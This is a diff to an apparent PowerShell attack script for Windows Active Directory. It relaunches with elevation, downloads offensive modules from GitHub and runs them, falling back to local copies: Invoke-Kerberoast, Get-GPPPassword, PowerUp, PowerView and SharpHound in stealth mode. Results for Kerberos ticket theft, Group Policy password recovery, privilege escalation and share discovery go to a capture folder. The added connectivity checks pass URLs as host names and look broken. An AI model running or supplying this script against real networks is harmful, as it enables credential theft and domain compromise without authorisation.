@@ -15,7 +15,7 @@ Start-Process powershell -Verb runAs -ArgumentList $arguments
 Break
 }
 #Create capture file
-$path = "C:\Capture"
+$path="C:\Capture"
 "Creating the capture folder..."
 If(!(test-path $path))
 {
@@ -26,20 +26,27 @@ else
 {
 	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
 }
+$modules=split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
+$client=New-Object System.Net.WebClient
 #specify modules folder
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
-
 #create kerberoast PS module folder
 If(!(test-path $modulepath/Kerberoast))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
 }
-
 #download Kerberoast
 Write-Host "Fetching Kerberoast module..."
-$client = New-Object System.Net.WebClient
+If(Test-Connection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" -Count 1 -Quiet)
+{
 $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
+}
 #Run Kerberoast
 Write-Host "Importing module..." 
 Import-Module Kerberoast.psm1
@@ -71,8 +78,15 @@ If(!(test-path $modulepath/Sharp))
 }
 Write-Host "Fetching Sharphound.exe..."
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$client = New-Object System.Net.WebClient
+If(Test-Connection -ComputerName "https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true" -Count 1 -Quiet)
+{
 $client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/Sharphound.exe" -Destination "$modulepath/Sharp"
+}
 Write-Host "Running SharpHound" -ForegroundColor  Yellow
 & "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
 
@@ -82,8 +96,15 @@ If(!(test-path $modulepath/PrivEsc))
       New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
 }
 Write-Host "Fetching PowerUp module..."
-$client = New-Object System.Net.WebClient
+If(Test-Connection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -Count 1 -Quiet)
+{
 $client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
+}
 Write-Host "Importing module..."
 Import-Module PrivEsc.ps1
 Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
@@ -96,11 +117,18 @@ If(!(test-path $modulepath/GPP))
 }
 #check for GPP passwords
 Write-Host "Fetching GPPP module..." 
-$client = New-Object System.Net.WebClient
+If(Test-Connection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1" -Count 1 -Quiet)
+{
 $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/Get-GPPPassword.ps1" -Destination "$modulepath/GPP/GPP.psm1"
+}
 #import module
 Write-Host "Importing module..." 
-Import-Module gpp.psm1
+Import-Module GPP.psm1
 #Run GPP. Verbose enabled so you know it's actually working or not
 Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
 Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
@@ -111,8 +139,17 @@ If(!(test-path $modulepath/PowerView))
       New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
 }
 Write-Host "Fetching PowerView module..." 
-$client = New-Object System.Net.WebClient
+
+If(Test-Connection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -Count 1 -Quiet)
+{
 $client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/PowerView.ps1" -Destination "$modulepath/PowerView/PowerView.psm1"
+
+}
 Write-Host "Importing module..."
 Import-Module PowerView.psm1
 Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
